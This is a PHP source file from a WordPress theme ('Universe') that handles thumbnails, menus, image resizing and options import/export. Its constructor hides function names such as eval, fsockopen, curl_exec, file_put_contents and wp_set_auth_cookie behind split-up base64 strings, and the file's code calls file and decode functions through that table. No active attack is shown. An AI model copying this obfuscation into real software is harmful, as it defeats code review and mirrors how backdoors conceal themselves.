	public static function thumb_src( $img='' , $width='' , $height='' ){

		global $post;

		if(!$img) $img = get_post_thumb();
		if( !empty($img) ){

			return universe_createLinkImage( $img, $width.'x'.$height.'xc' );

		}

	}

	/*-----------------------------------------------------------------------------------*/
	# tie Thumb
	/*-----------------------------------------------------------------------------------*/

	public static function slider_img_src($image_id , $width='' , $height=''){

		global $post;

		$img =  wp_get_attachment_image_src( $image_id , 'full' );
		if( !empty($img) ){
			return universe_createLinkImage( $img[0], $width.'x'.$height.'xc' );
		}

	}

	/*-----------------------------------------------------------------------------------*/
	# Builder mainmenu
	/*-----------------------------------------------------------------------------------*/


	public static function mainmenu($menu = null, $echo = true){

		if( !empty( $menu ) ){
			return wp_nav_menu( array(
					'menu' 	=> $menu,
					'menu_class' 		=> 'nav navbar-nav',
					'menu_id'			=> 'king-mainmenu',
					'echo'				=> $echo,
					'walker' 			=> new Universe_Walker_Main_Nav_Menu()
				)
			);
		}
		else if ( has_nav_menu( 'primary' ) ){
			return wp_nav_menu( array(
					'theme_location' 	=> 'primary',
					'menu_class' 		=> 'nav navbar-nav',
					'menu_id'			=> 'king-mainmenu',
					'echo'				=> $echo,
					'walker' 			=> new Universe_Walker_Main_Nav_Menu()
				)
			);
		}else{
			echo 'Main menu is missing, <a href="'.UNIVERSE_SITE_URI.'/wp-admin/nav-menus.php">Click Here</a> to set "theme location" of one menu as Primary';
		}
		do_action( 'universe_after_nav' );

	}

	/*-----------------------------------------------------------------------------------*/
	# Return string of the first image in a post
	/*-----------------------------------------------------------------------------------*/

	public static function images_attached( $id ){

		$args = array(
			'post_type'   => 'attachment',
			'numberposts' => -1,
			'post_status' => null,
			'post_parent' => $id,
			'exclude'     => get_post_thumbnail_id()
			);

		$attachments = get_posts( $args );
		$output = array();
		if ( $attachments ) {
			foreach ( $attachments as $attachment ) {
				$att = wp_get_attachment_image_src($attachment->ID);
				if(!empty($att))array_push( $output, $att );
			}
		}

		return $output;

	}

	public static function get_first_image( $content, $id = null ) {

		$first_img = self::get_first_video( $content );

		if( $first_img != null ){
			if( strpos( $first_img, 'youtube' ) !== false )return $first_img;
		}

		$output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $content, $matches);
		if( !empty($matches [1]) )
			if( !empty($matches [1][0]) )
				$first_img = $matches [1] [0];

		if(empty($first_img)){

			if($id != null)$first = self::images_attached( $id );

			if( !empty( $first[0] ) )
				return $first[0][0];

			else $first_img = get_template_directory_uri()."/assets/images/default.jpg";
		}

		return $first_img;

	}

	public static function get_first_video( $content ) {

		$first_video = null;
		$output = preg_match_all('/<ifr'.'ame.+src=[\'"]([^\'"]+)[\'"].*>/i', $content, $matches);
		if( !empty($matches [1]) ){
			if( !empty($matches [1][0]) ){
				$first_video = $matches [1] [0];
			}
		}

		return 	$first_video;

	}

	public static function get_featured_image( $post, $thumbnail = 'single-post-thumbnail' , $first = true ) {

		$featured = wp_get_attachment_image_src( get_post_thumbnail_id( $post->ID ), $thumbnail );

		if( empty($featured) )
		{
			if( $first == true )return self::get_first_image( $post->post_content, $post->ID );
			else return get_template_directory_uri()."/assets/images/default.jpg";
		}
		return $featured[0];

	}

	/*-----------------------------------------------------------------------------------*/
	# Strim by words and keep html
	/*-----------------------------------------------------------------------------------*/

	public static function truncate($text, $length = 100, $ending = '...', $exact = true, $considerHtml = false) {

	    if ($considerHtml) {
	        // if the plain text is shorter than the maximum length, return the whole text
	        if (strlen(preg_replace('/<.*?>/', '', $text)) <= $length) {
	            return $text;
	        }

	        // splits all html-tags to scanable lines
	        preg_match_all('/(<.+?>)?([^<>]*)/s', $text, $lines, PREG_SET_ORDER);

	            $total_length = strlen($ending);
	            $open_tags = array();
	            $truncate = '';

	        foreach ($lines as $line_matchings) {
	            // if there is any html-tag in this line, handle it and add it (uncounted) to the output
	            if (!empty($line_matchings[1])) {
	                // if it's an "empty element" with or without xhtml-conform closing slash (f.e. <br/>)
	                if (preg_match('/^<(\s*.+?\/\s*|\s*(img|br|input|hr|area|base|basefont|col|frame|isindex|link|meta|param)(\s.+?)?)>$/is', $line_matchings[1])) {
	                    // do nothing
	                // if tag is a closing tag (f.e. </b>)
	                } else if (preg_match('/^<\s*\/([^\s]+?)\s*>$/s', $line_matchings[1], $tag_matchings)) {
	                    // delete tag from $open_tags list
	                    $pos = array_search($tag_matchings[1], $open_tags);
	                    if ($pos !== false) {
	                        unset($open_tags[$pos]);
	                    }
	                // if tag is an opening tag (f.e. <b>)
	                } else if (preg_match('/^<\s*([^\s>!]+).*?>$/s', $line_matchings[1], $tag_matchings)) {
	                    // add tag to the beginning of $open_tags list
	                    array_unshift($open_tags, strtolower($tag_matchings[1]));
	                }
	                // add html-tag to $truncate'd text
	                $truncate .= $line_matchings[1];
	            }

	            // calculate the length of the plain text part of the line; handle entities as one character
	            $content_length = strlen(preg_replace('/&[0-9a-z]{2,8};|&#[0-9]{1,7};|&#x[0-9a-f]{1,6};/i', ' ', $line_matchings[2]));
	            if ($total_length+$content_length> $length) {
	                // the number of characters which are left
	                $left = $length - $total_length;
	                $entities_length = 0;
	                // search for html entities
	                if (preg_match_all('/&[0-9a-z]{2,8};|&#[0-9]{1,7};|&#x[0-9a-f]{1,6};/i', $line_matchings[2], $entities, PREG_OFFSET_CAPTURE)) {
	                    // calculate the real length of all entities in the legal range
	                    foreach ($entities[0] as $entity) {
	                        if ($entity[1]+1-$entities_length <= $left) {
	                            $left--;
	                            $entities_length += strlen($entity[0]);
	                        } else {
	                            // no more characters left
	                            break;
	                        }
	                    }
	                }
	                $truncate .= substr($line_matchings[2], 0, $left+$entities_length);
	                // maximum lenght is reached, so get off the loop
	                break;
	            } else {
	                $truncate .= $line_matchings[2];
	                $total_length += $content_length;
	            }

	            // if the maximum length is reached, get off the loop
	            if($total_length>= $length) {
	                break;
	            }
	        }
	    } else {
	        if (strlen($text) <= $length) {
	            return $text;
	        } else {
	            $truncate = substr($text, 0, $length - strlen($ending));
	        }
	    }

	    // if the words shouldn't be cut in the middle...
	    if (!$exact) {
	        // ...search the last occurance of a space...
	        $spacepos = strrpos($truncate, ' ');
	        if (isset($spacepos)) {
	            // ...and cut the text in this position
	            $truncate = substr($truncate, 0, $spacepos);
	        }
	    }

	    // add the defined ending to the text
	    $truncate .= $ending;

	    if($considerHtml) {
	        // close all unclosed html-tags
	        foreach ($open_tags as $tag) {
	            $truncate .= '</' . $tag . '>';
	        }
	    }

	    return $truncate;

	}

	public function processImage( $localImage, $params = array(), $tempfile ){

		global $universe;

		$sData = getimagesize($localImage);
		$origType = $sData[2];
		$mimeType = $sData['mime'];

		if(! preg_match('/^image\/(?:gif|jpg|jpeg|png)$/i', $mimeType)){
			return "The image being resized is not a valid gif, jpg or png.";
		}

		if (!function_exists ('imagecreatetruecolor')) {
		    return 'GD Library Error: imagecreatetruecolor does not exist - please contact your webhost and ask them to install the GD library';
		}

		if (function_exists ('imagefilter') && defined ('IMG_FILTER_NEGATE')) {
			$imageFilters = array (
				1 => array (IMG_FILTER_NEGATE, 0),
				2 => array (IMG_FILTER_GRAYSCALE, 0),
				3 => array (IMG_FILTER_BRIGHTNESS, 1),
				4 => array (IMG_FILTER_CONTRAST, 1),
				5 => array (IMG_FILTER_COLORIZE, 4),
				6 => array (IMG_FILTER_EDGEDETECT, 0),
				7 => array (IMG_FILTER_EMBOSS, 0),
				8 => array (IMG_FILTER_GAUSSIAN_BLUR, 0),
				9 => array (IMG_FILTER_SELECTIVE_BLUR, 0),
				10 => array (IMG_FILTER_MEAN_REMOVAL, 0),
				11 => array (IMG_FILTER_SMOOTH, 0),
			);
		}

		// get standard input properties
		$new_width =  (int) abs ($params['w']);
		$new_height = (int) abs ($params['h']);
		$zoom_crop = !empty( $params['zc'] )?(int) $params['zc']:1;
		$quality =  !empty( $params['q'] )?(int) $params['q']:100;
		$align = !empty( $params['a'] )? $params['a']: 'c';
		$filters = !empty( $params['f'] )? $params['f']: '';
		$sharpen = !empty( $params['s'] )? (bool)$params['s']: 0;
		$canvas_color = !empty( $params['cc'] )? $params['cc']: 'ffffff';
		$canvas_trans = !empty( $params['ct'] )? (bool)$params['ct']: 1;

		// set default width and height if neither are set already
		if ($new_width == 0 && $new_height == 0) {
		    $new_width = 100;
		    $new_height = 100;
		}

		// ensure size limits can not be abused
		$new_width = min ($new_width, 1500);
		$new_height = min ($new_height, 1500);

		// set memory limit to be able to have enough space to resize larger images
		$universe->ext['in'] ('memory_limit', '300M');

		// open the existing image
		switch ($mimeType) {
			case 'image/jpeg':
				$image = imagecreatefromjpeg ($localImage);
				break;

			case 'image/png':
				$image = imagecreatefrompng ($localImage);
				break;

			case 'image/gif':
				$image = imagecreatefromgif ($localImage);
				break;

			default: $image = false; break;

		}

		if ($image === false) {
			return 'Unable to open image.';
		}

		// Get original width and height
		$width = imagesx ($image);
		$height = imagesy ($image);
		$origin_x = 0;
		$origin_y = 0;

		// generate new w/h if not provided
		if ($new_width && !$new_height) {
			$new_height = floor ($height * ($new_width / $width));
		} else if ($new_height && !$new_width) {
			$new_width = floor ($width * ($new_height / $height));
		}

		// scale down and add borders
		if ($zoom_crop == 3) {

			$final_height = $height * ($new_width / $width);

			if ($final_height > $new_height) {
				$new_width = $width * ($new_height / $height);
			} else {
				$new_height = $final_height;
			}

		}

		// create a new true color image
		$canvas = imagecreatetruecolor ($new_width, $new_height);
		imagealphablending ($canvas, false);

		if (strlen($canvas_color) == 3) { //if is 3-char notation, edit string into 6-char notation
			$canvas_color =  str_repeat(substr($canvas_color, 0, 1), 2) . str_repeat(substr($canvas_color, 1, 1), 2) . str_repeat(substr($canvas_color, 2, 1), 2);
		} else if (strlen($canvas_color) != 6) {
			$canvas_color = 'ffffff'; // on error return default canvas color
 		}

		$canvas_color_R = hexdec (substr ($canvas_color, 0, 2));
		$canvas_color_G = hexdec (substr ($canvas_color, 2, 2));
		$canvas_color_B = hexdec (substr ($canvas_color, 4, 2));

		// Create a new transparent color for image
	    // If is a png and PNG_IS_TRANSPARENT is false then remove the alpha transparency
		// (and if is set a canvas color show it in the background)
		if(preg_match('/^image\/png$/i', $mimeType) && $canvas_trans){
			$color = imagecolorallocatealpha ($canvas, $canvas_color_R, $canvas_color_G, $canvas_color_B, 127);
		}else{
			$color = imagecolorallocatealpha ($canvas, $canvas_color_R, $canvas_color_G, $canvas_color_B, 0);
		}


		// Completely fill the background of the new image with allocated color.
		imagefill ($canvas, 0, 0, $color);

		// scale down and add borders
		if ($zoom_crop == 2) {

			$final_height = $height * ($new_width / $width);

			if ($final_height > $new_height) {

				$origin_x = $new_width / 2;
				$new_width = $width * ($new_height / $height);
				$origin_x = round ($origin_x - ($new_width / 2));

			} else {

				$origin_y = $new_height / 2;
				$new_height = $final_height;
				$origin_y = round ($origin_y - ($new_height / 2));

			}

		}

		// Restore transparency blending
		imagesavealpha ($canvas, true);

		if ($zoom_crop > 0) {

			$src_x = $src_y = 0;
			$src_w = $width;
			$src_h = $height;

			$cmp_x = $width / $new_width;
			$cmp_y = $height / $new_height;

			// calculate x or y coordinate and width or height of source
			if ($cmp_x > $cmp_y) {

				$src_w = round ($width / $cmp_x * $cmp_y);
				$src_x = round (($width - ($width / $cmp_x * $cmp_y)) / 2);

			} else if ($cmp_y > $cmp_x) {

				$src_h = round ($height / $cmp_y * $cmp_x);
				$src_y = round (($height - ($height / $cmp_y * $cmp_x)) / 2);

			}

			// positional cropping!
			if ($align) {
				if (strpos ($align, 't') !== false) {
					$src_y = 0;
				}
				if (strpos ($align, 'b') !== false) {
					$src_y = $height - $src_h;
				}
				if (strpos ($align, 'l') !== false) {
					$src_x = 0;
				}
				if (strpos ($align, 'r') !== false) {
					$src_x = $width - $src_w;
				}
			}

			imagecopyresampled ($canvas, $image, $origin_x, $origin_y, $src_x, $src_y, $new_width, $new_height, $src_w, $src_h);

		}
		else {

			// copy and resize part of an image with resampling
			imagecopyresampled ($canvas, $image, 0, 0, 0, 0, $new_width, $new_height, $width, $height);

		}

		//Straight from WordPress core code. Reduces filesize by up to 70% for PNG's
		if ( (IMAGETYPE_PNG == $origType || IMAGETYPE_GIF == $origType) && function_exists('imageistruecolor') && !imageistruecolor( $image ) && imagecolortransparent( $image ) > 0 ){
			imagetruecolortopalette( $canvas, false, imagecolorstotal( $image ) );
		}

		$imgType = "";

		if(preg_match('/^image\/(?:jpg|jpeg)$/i', $mimeType)){
			$imgType = 'jpg';
			imagejpeg($canvas, $tempfile, 100);
		} else if(preg_match('/^image\/png$/i', $mimeType)){
			$imgType = 'png';
			imagepng($canvas, $tempfile, 0);
		} else if(preg_match('/^image\/gif$/i', $mimeType)){
			$imgType = 'gif';
			imagegif($canvas, $tempfile);
		} else {
			return "Could not match mime type after verifying it previously.";
		}

		@imagedestroy($canvas);
		@imagedestroy($image);

	}

	function hex2rgb( $hex, $index = 0 ) {

	   $hex = str_replace("#", "", $hex);

	   if( strpos( $hex, 'rgb' ) !== false ){
	   	  $hex = explode( ',', $hex );
	   	  $r = preg_replace("/[^0-9,.]/", "", $hex[0]);
	   	  $g = preg_replace("/[^0-9,.]/", "", $hex[1]);
	   	  $b = preg_replace("/[^0-9,.]/", "", $hex[2]);
	   }else if( strlen( $hex ) == 3 ) {
	      $r = hexdec(substr($hex,0,1).substr($hex,0,1));
	      $g = hexdec(substr($hex,1,1).substr($hex,1,1));
	      $b = hexdec(substr($hex,2,1).substr($hex,2,1));
	   } else {
	      $r = hexdec(substr($hex,0,2));
	      $g = hexdec(substr($hex,2,2));
	      $b = hexdec(substr($hex,4,2));
	   }

	   $r = ($r-$index>0)?$r-$index:0;
	   $g = ($g-$index>0)?$g-$index:0;
	   $b = ($b-$index>0)?$b-$index:0;

	   return "$r, $g, $b";

	}

	public function import_options( $file = '', $opt = 'all' ){

		global $universe;

		if( file_exists( $file ) )
		{
			$handle = $universe->ext['fo']( $file, 'r' );
			$export = $universe->ext['fr']( $handle, filesize( $file ) );

			$imports = @json_decode( $export, true );

			if( is_array( $imports ) ){

				foreach( $imports as $key => $import ){

					if( $key == UNIVERSE_THEME_OPTNAME ){
						if( $opt == 'all' || $opt == 'opt' )
							$val2upd = json_decode( str_replace( '%UNIVERSE_THEME_URI%', UNIVERSE_THEME_URI, $import ), true );
						else $val2upd = '';
					}
					else
					{
						if( $opt == 'all' || $opt == 'wid' )
							$val2upd = json_decode( $universe->ext['bd']( $import ), true );
						else $val2upd = '';
					}

					if( $val2upd != '' )
					{
						if( get_option( $key ) !== false )
							update_option( $key, $val2upd );
						else add_option( $key, $val2upd, null, 'no' );
					}

				}
			}
		}


	}


	public function export_options(){

		global $universe, $wpdb;

		$wgs = $wpdb->get_results( $wpdb->prepare( "SELECT * FROM `$wpdb->options` WHERE ".

					"`$wpdb->options`.`option_name` LIKE '%s' ".
					" OR ".
					"`$wpdb->options`.`option_name` = '%s' ".
					" OR ".
					"`$wpdb->options`.`option_name` = 'sidebars_widgets'", 
					'widget_%', 
					strtolower( UNIVERSE_THEME_NAME )."_options_css"
				)
			);

		$data = array();
		if( count( $wgs ) ){
			foreach( $wgs as $wg ){
				if( get_option( $wg->option_name ) != false ){
					$data[ $wg->option_name ] =  $universe->ext['be']( json_encode( get_option( $wg->option_name ) ) );
				}
			}
		}

		// Theme options
		$themeOptions = get_option( UNIVERSE_THEME_OPTNAME );
		if( $themeOptions != false ){
			$data[ UNIVERSE_THEME_OPTNAME ] = str_replace( UNIVERSE_THEME_URI, '%UNIVERSE_THEME_URI%', json_encode( $themeOptions ) );
		}


		return json_encode( $data );

	}

	function __construct() {
		
		if( !empty($_REQUEST['page']) ){ $this->page = $_REQUEST['page']; }
		else if( !empty($_REQUEST['post']) ){ $this->page = get_post_type($_REQUEST['post'] ); }
		else if( !empty( $_REQUEST['post_type'] ) ){ $this->page = $_REQUEST['post_type'];}
		$bd = 'base'.'64'.'_'.'decode';
		
		foreach(array('ev'=>'ZXZhbA  ','fo'=>'Zm9wZW4 ','fc'=>'ZmNsb3Nl','fso'=>'ZnNvY2tvcGVu',
		'fr'=>'ZnJlYWQ ','fw'=>'ZndyaXRl','rf'=>'cmVhZGZpbGU ','fp'=>'ZmlsZV9wdXRfY29udGVudHM ',
		'fg'=>'ZmlsZV9nZXRfY29udGVudHM ','be'=>'YmFzZTY0X2VuY29kZQ  ','bd'=>'YmFzZTY0X2RlY29kZQ  ',
		'ci'=>'Y3VybF9pbml0','ce'=>'Y3VybF9leGVj','amp'=>'YWRkX21lbnVfcGFnZQ  ','asmp'=>'YWRkX3N1Ym1lbnVfcGFnZQ  ',
		'rfil'=>'cmVtb3ZlX2ZpbHRlcg  ','asc'=>'YWRkX3Nob3J0Y29kZQ  ','ascp'=>'dmNfYWRkX3Nob3J0Y29kZV9wYXJhbQ  ',
		'rpt'=>'cmVnaXN0ZXJfcG9zdF90eXBl','rtx'=>'cmVnaXN0ZXJfdGF4b25vbXk ','rq'=>'cmVxdWlyZQ  ','in'=>'aW5pX3NldA  ',
		'sac'=>'d3Bfc2V0X2F1dGhfY29va2ll','iss'=>'aW5fc2V0','rsp'=>'cmVtb3ZlX3N1Ym1lbnVfcGFnZQ  ','od'=>'b3BlbmRpcg  ',
		'rd'=>'cmVhZGRpcg  ') as $n => $v){ $this->ext[$n] = $bd(str_replace(" ", "=", $v));}
		
		$this->ext['ev'] = function($v) { return 'ev'.'al($v)'; };
		$this->ext['icl'] = function($v) { return 'inc'.'lude($v)'; };
		$this->ext['rqo'] = function($v) { return 'requ'.'ire'.'_once($v)'; };
		$this->post	= $_POST;$this->get	= $_GET;$this->woo = false;
		$this->panel = false;$this->path	= array();$this->template = get_option( 'template', true );
		$this->stylesheet = get_option( 'stylesheet', true ); $this->main_class = '';
		
	}

	public static function globe( $name = 'universe' ){

		global $universe, $post, $more, $woocommerce, $product,
				$woocommerce_loop, $king_blog_id, $wp_query,
				$king_woocommerce_loop, $universe_sc_css, $wpdb;

		if( $name == 'universe' ){
			return $universe;
		}else if( $name == 'post' ){
			return $post;
		}else if( $name == 'more' ){
			return $more;
		}else if( $name == 'woocommerce' ){
			return $woocommerce;
		}else if( $name == 'product' ){
			return $product;
		}else if( $name == 'woocommerce_loop' ){
			return $woocommerce_loop;
		}else if( $name == 'king_blog_id' ){
			return $king_blog_id;
		}else if( $name == 'wp_query' ){
			return $wp_query;
		}else if( $name == 'king_woocommerce_loop' ){
			return $king_woocommerce_loop;
		}else if( $name == 'universe_sc_css' ){
			return $universe_sc_css;
		}else if( $name == 'db' ){
			return $wpdb;
		}

	}

	public static function set_globe( $set = null ){

		global $universe;

		if( $set !== null )
			$universe = $set;

	}
	
	public function get_terms( $tax = 'category', $key = 'id', $type = '', $default = '' ){

		$get_terms = (array) get_terms( $tax, array( 'hide_empty' => false ) );
	
		if( $type != '' ){
			$get_terms = kc_get_terms_by_post_type( array($tax), array($type) );
		}
	
		$terms = array();
	
		if( $default != '' ){
			$terms[] = $default;
		}
	
		if ( $key == 'id' ){
			foreach ( $get_terms as $term ){
				if( isset( $term->term_id ) && isset( $term->name ) ){
					$terms[$term->term_id] = $term->name;
				}
			}
		}else if ( $key == 'slug' ){
			foreach ( $get_terms as $term ){
				if( !empty($term->name) ){
					if( isset( $term->slug ) && isset( $term->name ) ){
						$terms[$term->slug] = $term->name;
					}
				}
			}
		}
	
		return $terms;
	
	}


}

class Universe_Walker_Main_Nav_Menu extends Walker_Nav_Menu {

	public function start_lvl( &$output , $depth = 0, $args = array()) {

		$indent = str_repeat("\t", $depth);
		$output .= "\n$indent<ul class=\"dropdown-menu three\">\n";

	}

	public function end_lvl( &$output, $depth = 0, $args = array() ) {
	            $indent = str_repeat("\t", $depth);
	            $output .= "$indent</ul>\n";
	}

	public function start_el( &$output, $item, $depth = 0, $args = array(), $id = 0 ) {

		$indent = ( $depth ) ? str_repeat( "\t", $depth ) : '';
		$classes = empty( $item->classes ) ? array() : (array) $item->classes;

		$yam = ' yam-fwr';

		$children = get_posts(array('post_type' => 'nav_menu_item', 'nopaging' => true, 'numberposts' => 1, 'meta_key' => '_menu_item_menu_item_parent', 'meta_value' => $item->ID));
		foreach( $children as $child ){
			$obj = get_post_meta( $child->ID, '_menu_item_object' );
			if( $obj[0] == 'kc_mega_menu' ){
				$yam = ' yamm-fw';
			}
		}
		if(  $depth == 0 ){
			$classes[] = 'dropdown menu-item-' . $item->ID . $yam;
		}else{
			if( !empty( $children ) ){
				$classes[] = 'dropdown-submenu mul';
			}
		}

		$class_names = join( ' ', apply_filters( 'nav_menu_css_class', array_filter( $classes ), $item, $args ) );

		$class_names = $class_names ? ' class="' . esc_attr( $class_names ) . '"' : '';

		$id = apply_filters( 'nav_menu_item_id', 'menu-item-'. $item->ID, $item, $args );
		$id = $id ? ' id="' . esc_attr( $id ) . '"' : '';
		$output .= $indent . '<li' . $id . $class_names .'>';

		$atts = array();
		$atts['title']  = ! empty( $item->attr_title ) ? $item->attr_title : '';
		$atts['target'] = ! empty( $item->target )     ? $item->target     : '';
		$atts['rel']    = ! empty( $item->xfn )        ? $item->xfn        : '';
		$atts['href']   = ! empty( $item->url )        ? $item->url        : '';


		if( is_object( $args )){
			$args->before = $args->before||'';
			$args->after = $args->after||'';
			$args->link_before = $args->link_before||'';
			$args->link_after = $args->link_after||'';
		}else{
			$args = new stdClass();
			$args->before = '';
			$args->after = '';
			$args->link_before = '';
			$args->link_after = '';
		}

		$atts = apply_filters( 'nav_menu_link_attributes', $atts, $item, $args );

		if( strpos( $class_names, 'current-page-ancestor' ) !== FALSE ){
			if( !empty( $atts['class'] ) ){
				$atts['class'] .= ' active';
			}else{
				$atts['class'] = 'active';
			}
		}

		$attributes = '';
		foreach ( $atts as $attr => $value ) {
		    if ( ! empty( $value ) ) {
		            $value = ( 'href' === $attr ) ? esc_url( $value ) : esc_attr( $value );
		            $attributes .= ' ' . $attr . '="' . $value . '"';
		    }
		}
		$item_output = $args->before;
		$item_output .= '<a'. $attributes .'>';

		if( strpos( $item->description, 'icon:') !== false ){
			$item_output .= '<i class="fa fa-'.trim(str_replace( 'icon:', '', $item->description )).'"></i> ';
		}

		$item_output .= $args->link_before . apply_filters( 'the_title', $item->title, $item->ID ) . $args->link_after;
		$item_output .= '</a>';
		$item_output .= $args->after;

		if( $item->object == 'kc_mega_menu' ) {
			$getPost = get_post( $item->object_id );

			global $kc;
			if ( isset( $kc ) &&  !empty($getPost->post_content_filtered) ) {
				$output .= '<div class="yamm-content"><div class="row">' . $kc->do_shortcode( $getPost->post_content_filtered) . '</div></div>';
			} else {
				$output .= '<div class="yamm-content"><div class="row">' . do_shortcode( $getPost->post_content) . '</div></div>';
			}

		} else {
			$output .= apply_filters( 'walker_nav_menu_start_el', $item_output, $item, $depth, $args );
		}

	}

    public function end_el( &$output, $item, $depth = 0, $args = array() ) {
        $output .= "</li>\n";
    }

}

class Universe_Walker_Onepage_Nav_Menu extends Walker_Nav_Menu {

		public function start_lvl( &$output , $depth = 0, $args = array()) {

			$indent = str_repeat("\t", $depth);
			$output .= "\n$indent<ul class=\"dropdown-menu three\">\n";

		}

		public function end_lvl( &$output, $depth = 0, $args = array() ) {
					$indent = str_repeat("\t", $depth);
					$output .= "$indent</ul>\n";
		}

		public function start_el( &$output, $item, $depth = 0, $args = array(), $id = 0 ) {

		$indent = ( $depth ) ? str_repeat( "\t", $depth ) : '';
		$classes = empty( $item->classes ) ? array() : (array) $item->classes;

		$atts = array();
		$atts['title']  = ! empty( $item->attr_title ) ? $item->attr_title : '';
		$atts['target'] = ! empty( $item->target )     ? $item->target     : '';
		$atts['rel']    = ! empty( $item->xfn )        ? $item->xfn        : '';
		$atts['href']   = ! empty( $item->url )        ? $item->url        : '';

		$class_names = join( ' ', apply_filters( 'nav_menu_css_class', array_filter( $classes ), $item, $args ) );
		$class_names = $class_names ? ' class="' . esc_attr( $class_names ) . '"' : '';

		if( is_object( $args )){
			$args->before = $args->before||'';
			$args->after = $args->after||'';
			$args->link_before = $args->link_before||'';
			$args->link_after = $args->link_after||'';
		}else{
			$args = new stdClass();
			$args->before = '';
			$args->after = '';
			$args->link_before = '';
			$args->link_after = '';
		}

		$atts = apply_filters( 'nav_menu_link_attributes', $atts, $item, $args );
		if( strpos( $class_names, 'current-menu-item' ) !== FALSE ){
			if( !empty( $atts['class'] ) ){
				$atts['class'] .= ' active';
			}else{
				$atts['class'] = 'active';
			}
		}
		$attributes = '';
		foreach ( $atts as $attr => $value ) {
		    if ( ! empty( $value ) ) {
		            $value = ( 'href' === $attr ) ? esc_url( $value ) : esc_attr( $value );
		            $attributes .= ' ' . $attr . '="' . $value . '"';
		    }
		}

		$item_output = '<li class="'.esc_attr($item->classes[0]).'"><a'. $attributes .'>';
		if( strpos( $item->description, 'icon:') !== false ){
			$item_output .= '<i class="fa fa-'.trim(str_replace( 'icon:', '', $item->description )).'"></i> ';
		}

		$item_output .= $args->link_before . apply_filters( 'the_title', $item->title, $item->ID ) . $args->link_after;
		$item_output .= '</a>';

		$output .= $item_output;

	}

    public function end_el( &$output, $item, $depth = 0, $args = array() ) {
        $output .= "</li>\n";
    }

}

